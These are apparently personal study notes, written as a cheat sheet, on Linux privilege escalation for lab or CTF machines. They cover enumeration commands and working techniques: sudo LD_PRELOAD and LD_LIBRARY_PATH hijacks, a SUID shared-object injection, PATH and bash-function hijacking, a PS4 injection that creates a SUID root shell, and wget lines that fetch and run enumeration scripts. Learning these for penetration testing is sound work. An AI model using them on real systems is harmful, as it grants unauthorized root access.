---
{"dg-publish":true,"permalink":"/notes/escalating-privileges-2/"}
---

 Important
- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence, so you can access the machine again later.
- Change privilege of users
- Execute any administrative command
- Get that cheeky root flag ;)
![Pasted image 20240607184831.png|500](/img/user/Pasted%20image%2020240607184831.png)
# Linux privesc
## Basic
### Stable shell

### Get a bash
```shell
script /dev/null -c bash
```
### exec bash like a sudo
```shell
sudo -u root /bin/bash
```
## System enumeration - Manual
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




| Option                                                                                                                                                        | Description                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| `find .`                                                                                                                                                      | Search in the currenty dir                             |
| `find / -name dirname`                                                                                                                                        | Find a dirs by name in the /                           |
| `find . -iname my-file`                                                                                                                                       | Don't differen between Mayus                           |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | Redirect the (stderr) to a hole                        |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | list the contend of each dir                           |
| `find / -type f -perm 4000 2>/dev/null`                                                                                                                       | search files [[Operative System/Linux/Permisos/SUID\|SUID]]                                  |
| `find -a`<br>`-a \( -perm -u+s -o -perm -g+s \)`                                                                                                              | Combine conditions [[Operative System/Linux/Permisos/SUID\|SUID]] or [[Operative System/Linux/Permisos/SGID\|SGID]]<br>`-o ` is OR |
| `find / -type -d -group wheel 2>/dev/null`                                                                                                                    | find dirs in the group wheel                           |
| `find -executable`<br>`find / -perm a=x`                                                                                                                      | Find items executable                                  |
| `find / -writable -type d 2>/dev/null`<br>`find / -perm -222 -type d 2>/dev/null`<br>`find / -perm -o w -type d 2>/dev/null`                                  | Find world-writable folders                            |
| `find / -writable -type d 2>/dev/null \| cut -d "/" -f 2 \| sort -u`                                                                                          | First Writable folders                                 |
| `find / -writable 2>/dev/null \| cut -d "/" -f 2,3 \| grep -v proc \| sort -u`<br>`find / -writable 2>/dev/null \| grep  usr \| cut -d "/" -f 2,3 \| sort -u` | 1 and 2 Writable folders<br>`usr`                      |
| `find ! -executable`                                                                                                                                          | Find items **not** executables                         |
| `find / -user root -writable 2>/dev/null`<br>`find / -user root -executable -type -f 2>/dev/null`<br>                                                         | Find items from root user                              |
| `find -name dex\* 2>/dev/null`                                                                                                                                | Find files that start by dex                           |
| `find -name \*exdump\* 2>/dev/null`                                                                                                                           | FInd files that content exdump between his name        |
| `find -name dex\*.sh 2>/dev/null`                                                                                                                             | Start with dex and finish in .sh                       |
| `find / -size +5G`                                                                                                                                            | List all files with more than 5 Gigabites              |
| `find / -size 10M`                                                                                                                                            | List all files with exactly 10 megabytes               |
| `find / -size -5M`                                                                                                                                            | List all files with less than 5 megabytes              |
| `find / - empty`                                                                                                                                              | Find empty items in the system                         |
| `find . -name "*.md*" -type f -exec grep -l "text to search" {} +`                                                                                            | Search a file by the content of it                     |
| `find / -mtime 10`                                                                                                                                            | Find files that were modified in the last 10 days      |
| `find / -atime 10`                                                                                                                                            | Find files that were accessed in the last 10 day       |
| `find / -cmin -60`                                                                                                                                            | find files changed within the last hour (60 minutes)   |
| `find / -amin -60`                                                                                                                                            | find files accesses within the last hour (60 minutes)  |

- **c** – bytes
- **k** – kilobytes
- **M** – megabytes
- **G** – gigabytes
- **b** – trozos de 512 bytes

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



| Option                          | Description                                                                                   |
| ------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -a`                    | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au` | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                    | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                    | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                   | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -i`                    | Shows interface statistics.                                                                   |
| `netstat -ano`                  | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |


</div></div>

## System enumeration - Automated
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



to scan vulns in linux

```shell
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh
```



</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



``` shell
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && chmod +x lse.sh
```

execute more deep scan
```
./lse.sh -l 2
```

[[lse code\|lse code]]

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- snoop on processes without need for root permissions.
- see commands run by other users, cron jobs, etc.
```sh
https://github.com/DominicBreuker/pspy/releases
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- System enumeration - Automated
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
**linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && \
perl linux-exploit-suggester-2.pl
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)


</div></div>

## Sudo -l
```bash
sudo -l
```

to check another user
```shell
sudo -l -U tracy
```
### Shell Escape Sequences
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- [[Hacking Ético y Pentesting/sudo -l\|sudo -l]]
### Leverage application functions
- Some applications will not have a known exploit within this context.
- we can use a "hack" to leak information **leveraging a function of the application.**

Example: Apache2 ant the `-f` parameter used to load the `/etc/shadow`, this will result in an error message that includes the first line of the `/etc/shadow` file.
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Sudo can be configured to **inherit** certain environment **variables from the user**'s environment.
- Check which environment variables are inherited (look for the env_keep options):
```shell
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
- LD_PRELOAD and LD_LIBRARY_PATH are both **inherited from the user's environment**.
- LD_PRELOAD loads a shared object before any others when a program is run.
- LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
### LD_PRELOAD
- Create a shared object using the code located at /home/user/tools/sudo/[[preload.c\|preload.c]]:
```shell
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
- Run one program (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
- A root shell should spawn.
```shell
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
### LD_LIBRARY_PATH
Run ldd against the apache2 program file to see which shared libraries are used by the program:
```shell
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/[[library_path.c\|library_path.c]]:
```shell
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp
```shell
sudo LD_LIBRARY_PATH=/tmp apache2
```

</div></div>

## SUID-SGID executables scaling
- https://gtfobins.github.io/
- [[Operative System/Linux/Permisos/SUID\|SUID]] [[Operative System/Linux/Permisos/SGID\|SGID]]
Check files with SUID or SGID permission
```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Check files with SUID permision
```shell
find / -perm -u=s -type f -ls 2>/dev/null
```
Check files with SUID permision
```shell
find / -perm -g=s -type f -ls 2>/dev/null
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Find a known exploit. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!


| exim-4.84-3 | [[cve-2016-1531.sh\|cve-2016-1531.sh]] |
| ----------- | -------------------- |


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If we have a executable
- Search if is trying to load shared objects, but it cannot be found.
```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
  ```

- like this
`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`

- Create the **.config** directory for the libcalc.so file:
```sh
mkdir /home/user/.config
```
- **Compile** the code [[libcalc.c\|libcalc.c]] (It **simply spawns a Bash shell.**) into a shared object at the location the **suid-so** executable was looking for it:
```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
- Run again
`/usr/local/bin/suid-so`

`strace /usr/bin/mount 2>&1 | grep -iE "open|access|no such file"`

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If an executable can be exploited due to it inheriting the user's PATH and attempting to execute programs without specifying an absolute path.
- In this example the executable is trying to start an apache2 webserver
- Use `string` to look for string in the file.
```shell
strings /usr/local/bin/suid-env
```
- One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however **the full path** of the executable (/usr/sbin/service) **is not being used**.
- Compile the code (spawn a bash shell) [[service.c\|service.c]] into an executable.
```shell
gcc -o service /home/user/tools/suid/service.c
```
- Or like an e.g. copy the shell file as a executable
```shell
echo /bin/bash > file_to_execute
```
- Change the PATH [[PATH exploiting\|PATH exploiting]]
```shell
export PATH=/path_to_executable:$PATH
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Bash versions `<4.2-048`
- Define shell **functions** with **names** that **resemble** file paths
- then **export** those functions so that they are used **instead** of any actual **executable** at that file **path**.
- If we have an executable `strings /usr/local/bin/suid-env2`
`strings /usr/local/bin/suid-env2`
`/usr/sbin/service apache2 start`
- Create a Bash function with the name `usr/sbin/service` that executes a new Bash shell (using -p so permissions are preserved)
```shell
function /usr/sbin/service { /bin/bash -p; }
```
- export the function:
```shell
export -f /usr/sbin/service
```
- Run the executable
## Bash `<4.4`
-  If we have an executable 
- In debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
- Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```shell
/tmp/rootbash -p
```

</div></div>

